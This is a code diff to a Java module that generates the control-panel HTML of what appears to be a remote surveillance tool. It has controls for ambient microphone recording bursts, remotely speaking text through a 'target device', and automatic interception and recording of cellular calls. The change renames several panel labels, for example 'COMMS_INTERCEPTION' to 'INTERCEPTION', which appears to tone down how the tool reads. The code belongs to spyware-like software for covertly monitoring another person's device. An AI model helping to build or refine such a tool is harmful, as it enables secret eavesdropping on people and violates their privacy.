@@ -351,9 +351,9 @@ public class AcousticsModule extends BaseModule {
             .append("<button onclick=\"startMicRec(300)\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">5m_BURST</button>")
             .append("</div></div>");
 
-        // --- VOICE EMISSION (TEXT-TO-SPEECH) SECTION (PLACED RIGHT BELOW AMBIENT_MIC) ---
+        // --- TEXT TO SPEECH SECTION (PLACED RIGHT BELOW AMBIENT_MIC) ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow);\">");
-        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-yellow);\">VOICE_EMISSION (TEXT-TO-SPEECH) <span class=\"info-trigger\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\" onclick=\"showInfo(event, 'VOICE_EMISSION', 'Remotely transmit text to be spoken out loud via the target device speakers using native TTS engine.')\">INFO</span></h2>");
+        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-yellow);\">TEXT_TO_SPEECH <span class=\"info-trigger\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\" onclick=\"showInfo(event, 'TEXT TO SPEECH', 'Remotely transmit text to be spoken out loud via the target device speakers using native TTS engine.')\">INFO</span></h2>");
         html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; margin-top: 15px;\">");
         
         // Row 1: Input Box + Transmit Button
@@ -386,7 +386,7 @@ public class AcousticsModule extends BaseModule {
 
         // Call recording section
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">")
-            .append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-cyan);\">COMMS_INTERCEPTION <span class=\"info-trigger\" onclick=\"showInfo(event, 'COMMS_INTERCEPTION', 'Automated monitoring and recording of cellular voice communications.')\">INFO</span></h2>")
+            .append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-cyan);\">INTERCEPTION <span class=\"info-trigger\" onclick=\"showInfo(event, 'INTERCEPTION', 'Automated monitoring and recording of cellular voice communications.')\">INFO</span></h2>")
             .append("<div style=\"display: grid; grid-template-columns: 1fr; gap: 12px; margin-top: 20px;\">")
             .append("<div class=\"toggle-container\">")
             .append("<span style=\"font-size: 0.8rem; color: #ccc;\">AUTO_RECORD_CALLS:</span>")
